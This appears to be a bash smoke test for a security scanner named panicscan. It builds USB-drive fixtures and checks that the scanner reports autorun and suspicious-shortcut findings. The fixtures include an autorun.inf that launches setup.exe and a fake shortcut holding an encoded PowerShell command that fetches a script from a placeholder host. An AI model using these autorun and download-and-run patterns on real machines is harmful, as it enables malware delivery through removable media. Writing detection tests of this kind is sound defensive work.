#!/usr/bin/env bash
set -euo pipefail

repo_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$repo_root"
source "$repo_root/scripts/lib/panicscan_binary.sh"

cargo build -p panicscan >/dev/null
bin="$(resolve_panicscan_bin debug)"

root="${PANICSCAN_USB_DETECTION_ROOT:-$(mktemp -d /tmp/panicscan-usb-detection.XXXXXX)}"
json_path="${PANICSCAN_USB_DETECTION_JSON:-$root/usb-detection.json}"
html_path="${PANICSCAN_USB_DETECTION_HTML:-$root/usb-detection.html}"
stdout_path="${PANICSCAN_USB_DETECTION_STDOUT:-$root/usb-detection.stdout}"
stderr_path="${PANICSCAN_USB_DETECTION_STDERR:-$root/usb-detection.stderr}"

mkdir -p "$root/links" \
  "$(dirname "$json_path")" \
  "$(dirname "$html_path")" \
  "$(dirname "$stdout_path")" \
  "$(dirname "$stderr_path")"

cat >"$root/autorun.inf" <<'EOF'
[autorun]
open=setup.exe
shellexecute=setup.exe
EOF

printf 'C:\\Windows\\System32\\powershell.exe -EncodedCommand SQBFAFgA https://example.test/a.ps1\n' \
  >"$root/links/invoice.lnk"

"$bin" usb "$root" --json "$json_path" --html "$html_path" >"$stdout_path" 2>"$stderr_path"

scripts/validate_report_schema.sh "$json_path" "$stdout_path" >/dev/null
scripts/validate_html_offline.sh "$html_path" >/dev/null

python3 - "$json_path" "$stdout_path" <<'PY'
import json
import pathlib
import sys

json_path = pathlib.Path(sys.argv[1])
stdout_path = pathlib.Path(sys.argv[2])
report = json.loads(json_path.read_text(encoding="utf-8"))
stdout_report = json.loads(stdout_path.read_text(encoding="utf-8"))

required = {
    "autorun.exec_entry",
    "autorun.executable_reference",
    "lnk.suspicious_launcher",
    "lnk.suspicious_arguments",
}


def evidence_codes(document):
    codes = set()
    for finding in document.get("findings", []):
        for evidence in finding.get("evidences", []):
            codes.add(evidence.get("code"))
    return codes


codes = evidence_codes(report)
missing = sorted(required - codes)
if missing:
    raise SystemExit(f"missing USB detection evidence codes: {missing}; got {sorted(codes)}")

stdout_codes = evidence_codes(stdout_report)
missing_stdout = sorted(required - stdout_codes)
if missing_stdout:
    raise SystemExit(
        f"stdout missing USB detection evidence codes: {missing_stdout}; got {sorted(stdout_codes)}"
    )

print("usb_detection_smoke=passed")
print(f"findings_count={len(report.get('findings', []))}")
print("detected_codes=" + ",".join(sorted(required)))
print(f"json={json_path}")
print(f"stdout={stdout_path}")
PY

